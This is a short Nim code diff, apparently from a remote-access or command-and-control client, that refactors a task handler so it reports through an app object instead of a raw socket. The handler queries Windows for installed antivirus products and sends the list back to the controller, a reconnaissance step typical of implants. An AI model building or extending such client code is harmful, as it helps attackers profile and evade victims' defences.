@@ -1,10 +1,9 @@
-from std/net import Socket
 import std/[json, jsonutils]
 
 import winim/com
-import ../client/communication
+import ../client/[communication, types]
 
-proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
+proc executeTask*(app: App, taskId: int, params: seq[string]) =
   var antiviruses: seq[tuple[name: string]] = @[]
   let taskOutput = newTaskOutput taskId
 
@@ -14,4 +13,4 @@ proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
     antiviruses.add (name: $av.displayName)
   
   taskOutput.addData Object, "response", $(toJson antiviruses)
-  socket.sendOutput taskOutput
+  app.sendOutput taskOutput
